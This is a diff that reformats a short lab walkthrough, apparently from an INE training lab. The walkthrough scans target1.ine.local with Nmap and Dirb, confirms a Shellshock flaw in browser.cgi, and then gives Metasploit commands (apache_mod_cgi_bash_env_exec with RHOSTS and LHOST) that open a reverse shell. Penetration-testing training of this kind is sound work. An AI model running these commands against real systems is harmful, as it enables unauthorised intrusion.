@@ -3,25 +3,25 @@
 
 We begin with an Nmap scan across all ports, which reveals that only port 80 is open
 
-  nmap -sS -O -p- -T4 target1.ine.local
-  nmap -sS -O -p80 -sV -T4 target1.ine.local
+    nmap -sS -O -p- -T4 target1.ine.local
+    nmap -sS -O -p80 -sV -T4 target1.ine.local
 
 A service scan reveals Apache 2.4.6 (Unix) on the target system.
 
 We proceed with a Dirb scan to enumerate possible useful folders. It finds cgi-dbin folder and the home page of the site named browser.cgi.
 This suggest we could attempt a Shellshocked vulnerability exploit.
 
-nmap target1.ine.local --script http-shellshock --script-args "http-shellshock.uri=/browser.cgi"
+    nmap target1.ine.local --script http-shellshock --script-args "http-shellshock.uri=/browser.cgi"
 
 Nmap reveals that the file browser.cgi is vulnerable to Shellshock.
 
 We proceed with Metasploit:
-search shellshock
-use exploit/multi/http/apache_mod_cgi_bash_env_exec
-setg RHOSTS target1.ine.local
-setg TARGETURI /browser.cgi
-setg LHOST 192.164.224.2 
-run
+- search shellshock
+- use exploit/multi/http/apache_mod_cgi_bash_env_exec
+- setg RHOSTS target1.ine.local
+- setg TARGETURI /browser.cgi
+- setg LHOST 192.164.224.2 
+- run
 
 Note: If something is not working, try selecting another LPORT.
 
